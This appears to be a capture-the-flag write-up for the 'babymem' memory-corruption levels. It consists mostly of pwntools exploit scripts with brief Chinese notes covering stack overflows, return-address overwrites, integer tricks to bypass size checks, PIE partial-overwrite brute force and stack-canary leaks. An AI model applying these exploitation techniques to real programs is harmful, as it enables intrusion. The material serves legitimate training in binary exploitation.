level 1
from pwn import *

p=process(["/challenge/babymem_level1.1"])

n=77
p.sendlineafter("size: ",str(n))
p.sendlineafter(")!\n","1"*n)

p.interactive()

level 2
计算malloc_first和calloc的地址之差

level 3
             _________
input_add-->|_________|
     .      |_________|
     .      |_________|
     .      |_________|
rbp-------->|_________|
ret_addr--->|_________|

覆盖ret_addr为指定函数

level 4
利用负数绕过大小检测

level 5
利用乘法溢出绕过检测

level 6
直接跳到win函数内地址

level 7
有回显
from pwn import *

p=process(["/challenge/babymem_level8.0"])

#get base addr
p.recvuntil("(rsp+0x00d8)")
a=p.recvuntil("+")
add=a[-22:-4]
win_addr=int(add,16)
win_addr=win_addr-0x9f3

n=(176)
p.sendlineafter("Payload size: ",str(n))

payload=p64(win_addr)*22
p.sendlineafter(")!\n",payload)

p.interactive()

无回显
地址爆破
from pwn import *

p=process(["/challenge/babymem_level7.1"])

#get base addr

n=(122)
p.sendlineafter("Payload size: ",str(n))

payload=p64(0x0)*15+b'\xe1\x16'
p.sendlineafter(")!\n",payload)

p.interactive()

level 9
             _________
buffer----->|_________| \
            |_________|  \
            |_________|   |-->buffer_size
            |_________|  /
            |_________| /
            |____|____|<---var 'n'
rbp-------->|_________|
ret_addr--->|_________|

payload_size=(buffer-ret_addr-1)+3

payload=[byte_var(buffer-ret_addr-1)]*(buffer_size+1)+win_address

from pwn import *
for i in range(0x20):
    p=process(["/challenge/babymem_level9.1"])

    n=0x6a
    p.sendlineafter("Payload size: ",str(n))

    payload=b'\x67'*0x51+b'\x24\x40'
    p.sendlineafter(")!\n",payload)

    p.interactive()

level 10
                  _________
buffer---------->|_________|
                 |_________|
                 |_________|
flag_val-------->|_________|
                 |_________|
                 |_________|
覆盖成连续即可泄露出flag值。

level 11
同level 10，只是换在堆上。

level 12
from pwn import *
for i in range(0x10):
    p=process(["/challenge/babymem_level12.0"])
    #p=remote("127.0.0.1","1337")
    
    n=0x49
    p.sendlineafter("Payload size: ",str(n))

    payload=b'\x90'*(n-1-6)+b'REPEAT'
    p.sendlineafter(")!\n",payload)
    
    p.recvuntil("You said: ")

    p.recvuntil("\n",drop=1)
    recv_data=p.recv(7)
    can=b'\x00'+recv_data
    cc=u64(can)
    print(hex(cc))
    
    n=0x58+2
    p.sendlineafter("Payload size: ",str(n))

    payload=b'\x90'*(0x48)+p64(cc)+p64(0x90)+b'\x74\x47'
    p.sendlineafter(")!\n",payload)
    
    p.interactive()


level 14.0
printf泄露canory，再次调用覆写返回地址。
from pwn import *
for i in range(0x20):
    p=process(["/challenge/babymem_level14.0"])

    n=0x69
    p.sendlineafter("Payload size: ",str(n))

    payload=b'\x90'*(0x69-1-6)+b'REPEAT'
    p.sendlineafter(")!\n",payload)
    
    p.recvuntil("You said: ")

    recv_data=p.recvuntil("This",drop=1)
    can=b'\x00'+recv_data[-12:-5]
    cc=u64(can)
    print(hex(cc))

    n=0x188+2
    p.sendlineafter("Payload size: ",str(n))

    payload=b'\x90'*(0x180-8)+p64(cc)+p64(0x90)+b'\x3b\x44'
    p.sendlineafter(")!\n",payload)


    p.interactive()

level 15
